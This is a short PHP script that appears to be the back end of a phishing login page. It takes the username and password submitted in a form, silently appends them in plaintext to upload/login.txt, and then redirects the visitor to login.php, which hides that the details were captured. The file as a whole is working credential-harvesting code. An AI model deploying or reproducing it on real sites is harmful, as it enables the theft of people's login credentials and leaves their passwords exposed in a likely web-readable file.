<?php
$fn = "upload/login.txt";
$user = $_POST['user'];
$pass = $_POST['pass'];

$fp = fopen($fn,"a") or die ("Error opening file in write mode!");

$content = $user.$pass;

fputs($fp, $content . "\r\n");

fclose($fp) or die ("Error closing file!");

header ("location:login.php");
?>
